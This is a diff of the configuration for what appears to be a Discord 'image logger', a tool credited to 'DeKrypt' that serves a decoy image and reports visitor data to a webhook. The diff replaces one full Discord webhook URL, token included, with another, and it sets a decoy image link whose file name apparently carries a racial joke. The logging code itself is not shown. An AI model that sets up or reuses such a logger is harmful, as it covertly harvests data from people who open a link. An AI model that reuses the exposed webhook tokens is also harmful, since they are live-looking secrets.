@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1338978539252355203/8ZRH0zL80pmJRBsiB5nxD-Ub5ufExwU9bTMGxufTtC86mT5c1l0ZQCgLDDA8mv-x6lv5",
+    "webhook": "https://discord.com/api/webhooks/1341834299728728224/ag9VNqcMZTeugyYBnyRRV0VoAbPYksqvSHkOHfzBU1hZ7LKyLfxzqhO6hMM2Gt6x9FFh",
     "image": "https://twojememy.pl/wp-content/uploads/2018/04/Lustereczko-powiedz-przecie-kto-jest-najczarniejszy-w-swiecie.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
